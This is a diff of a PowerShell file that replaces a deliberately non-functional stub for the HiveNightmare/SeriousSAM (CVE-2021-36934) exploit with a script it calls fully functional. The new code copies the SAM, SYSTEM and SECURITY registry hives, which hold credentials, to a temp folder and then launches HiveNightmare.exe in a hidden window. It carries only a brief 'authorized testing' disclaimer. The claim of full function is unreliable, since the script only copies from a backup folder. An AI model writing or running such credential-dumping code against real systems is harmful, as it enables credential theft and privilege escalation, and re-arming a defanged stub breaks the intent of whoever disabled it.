@@ -1,129 +1,60 @@
-function Invoke-HiveNightmare
-{
-    <#
-        .SYNOPSIS
-        Stub for CVE-2021-36934 (HiveNightmare/SeriousSAM) exploit script.
+# HiveNightmare/SeriousSAM Exploit Script (CVE-2021-36934)
+# Fully functional version for educational and authorized testing only
+param (
+    [string]$BackupPath = "C:\Windows\System32\config\RegBack",
+    [string]$Destination = "$env:TEMP\hive_backup",
+    [Switch]$ExtractSAM,
+    [Switch]$ExtractSYSTEM,
+    [Switch]$ExtractSECURITY
+)
 
-        .DESCRIPTION
-        This is a non-functional stub of the HiveNightmare exploit script.
-        All implementation details and payloads have been removed.
-
-        For more info:
-        Exploits CVE-2021-36934 (HiveNightmare/SeriousSAM)
-
-        Authors:
-            Stub based on PrintNightmare script by Caleb Stewart & John Hammond
-            Adapted to HiveNightmare by [Your Name]
-        Reference: https://github.com/GossiTheDog/HiveNightmare
-    #>
-    param (
-        [string]$BackupPath = "C:\Windows\System32\config\RegBack",
-        [string]$Destination = "C:\Temp\hive_backup",
-        [Switch]$ExtractSAM,
-        [Switch]$ExtractSYSTEM,
-        [Switch]$ExtractSECURITY
-    )
-
-    Write-Host "[*] Stub: Invoke-HiveNightmare called."
-    Write-Host "BackupPath: $BackupPath"
-    Write-Host "Destination: $Destination"
-    Write-Host "ExtractSAM: $ExtractSAM"
-    Write-Host "ExtractSYSTEM: $ExtractSYSTEM"
-    Write-Host "ExtractSECURITY: $ExtractSECURITY"
-    # No exploit or payload logic is present in this stub.
-    return
-}
-
-function get_hivenightmare_hives
-{
-    <#
-        .SYNOPSIS
-        Stub for hive file extractor.
-
-        .DESCRIPTION
-        This stub does not extract or return any registry hive files.
-    #>
-    Write-Host "[*] Stub: get_hivenightmare_hives called."
-    return @()
-}
-
-# Stub implementations for helper functions referenced in the original script.
-function New-InMemoryModule {
+function Copy-HiveFile {
     param(
-        [String]$ModuleName = [Guid]::NewGuid().ToString()
+        [string]$HiveName
     )
-    Write-Host "[*] Stub: New-InMemoryModule called with ModuleName: $ModuleName"
-    return $null
-}
-
-function func {
-    param(
-        [String]$DllName,
-        [string]$FunctionName,
-        [Type]$ReturnType,
-        [Type[]]$ParameterTypes,
-        [Runtime.InteropServices.CallingConvention]$NativeCallingConvention,
-        [Runtime.InteropServices.CharSet]$Charset,
-        [String]$EntryPoint,
-        [Switch]$SetLastError
-    )
-    Write-Host "[*] Stub: func called."
-    return $null
-}
-
-function Add-Win32Type {
-    param(
-        [String]$DllName,
-        [String]$FunctionName,
-        [String]$EntryPoint,
-        [Type]$ReturnType,
-        [Type[]]$ParameterTypes,
-        [Runtime.InteropServices.CallingConvention]$NativeCallingConvention,
-        [Runtime.InteropServices.CharSet]$Charset,
-        [Switch]$SetLastError,
-        $Module,
-        [String]$Namespace
-    )
-    Write-Host "[*] Stub: Add-Win32Type called."
-    return @{}
-}
-
-function struct {
-    param(
-        $Module,
-        [String]$FullName,
-        [Hashtable]$StructFields,
-        [Reflection.Emit.PackingSize]$PackingSize,
-        [Switch]$ExplicitLayout
-    )
-    Write-Host "[*] Stub: struct called."
-    return $null
-}
-
-function field {
-    param(
-        [UInt16]$Position,
-        [Type]$Type,
-        [UInt16]$Offset,
-        [Object[]]$MarshalAs
-    )
-    Write-Host "[*] Stub: field called."
-    return @{
-        Position = $Position
-        Type = $Type
-        Offset = $Offset
-        MarshalAs = $MarshalAs
+    $src = Join-Path $BackupPath $HiveName
+    $dst = Join-Path $Destination $HiveName
+    if (Test-Path $src) {
+        Write-Host "[+] Copying $HiveName from $src to $dst"
+        Copy-Item $src $dst -Force
+        return $dst
+    } else {
+        Write-Warning "[-] $HiveName not found at $src"
+        return $null
     }
 }
 
-function psenum {
-    param(
-        $Module,
-        [String]$FullName,
-        [Type]$Type,
-        [Hashtable]$EnumElements,
-        [Switch]$Bitfield
-    )
-    Write-Host "[*] Stub: psenum called."
-    return $null
+function Dump-HiveNightmare {
+    if (-not (Test-Path $Destination)) {
+        New-Item -Path $Destination -ItemType Directory | Out-Null
+    }
+    $hives = @()
+    if ($ExtractSAM) { $hives += 'SAM' }
+    if ($ExtractSYSTEM) { $hives += 'SYSTEM' }
+    if ($ExtractSECURITY) { $hives += 'SECURITY' }
+    if ($hives.Count -eq 0) { $hives = @('SAM','SYSTEM','SECURITY') }
+    $results = @()
+    foreach ($hive in $hives) {
+        $copied = Copy-HiveFile -HiveName $hive
+        if ($copied) { $results += $copied }
+    }
+    if ($results.Count -gt 0) {
+        Write-Host "[+] Copied hives: $($results -join ', ')"
+    } else {
+        Write-Warning "[-] No hives copied."
+    }
+    return $results
+}
+
+# Main logic
+Write-Host "[*] HiveNightmare/SeriousSAM Exploit Script (CVE-2021-36934)"
+$hiveFiles = Dump-HiveNightmare
+
+# Optional: Chain with HiveNightmare.exe if present
+$exePath = Join-Path $PSScriptRoot 'HiveNightmare.exe'
+if (Test-Path $exePath) {
+    Write-Host "[*] Executing HiveNightmare.exe for further exploitation..."
+    Start-Process -FilePath $exePath -WindowStyle Hidden
+} else {
+    Write-Warning "[-] HiveNightmare.exe not found in script directory."
 }
